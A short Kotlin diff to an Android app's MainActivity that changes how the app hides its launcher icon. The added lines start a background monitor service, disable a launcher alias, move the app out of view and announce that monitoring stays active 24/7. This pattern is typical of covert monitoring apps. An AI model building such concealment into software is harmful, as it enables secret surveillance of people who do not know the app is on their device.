@@ -137,14 +137,18 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun hideAppIcon() {
+        // Ensure background service is running before hiding launcher component
+        startMonitorService()
+        
         val p = packageManager
-        val componentName = ComponentName(this, MainActivity::class.java)
+        val aliasComponent = ComponentName(packageName, "$packageName.MainActivityAlias")
         p.setComponentEnabledSetting(
-            componentName,
+            aliasComponent,
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
             PackageManager.DONT_KILL_APP
         )
-        Toast.makeText(this, "App icon hidden from home screen. Still accessible in App Manager.", Toast.LENGTH_LONG).show()
+        Toast.makeText(this, "App icon hidden. Monitoring remains active 24/7.", Toast.LENGTH_LONG).show()
+        moveTaskToBack(true)
         finish()
     }
 
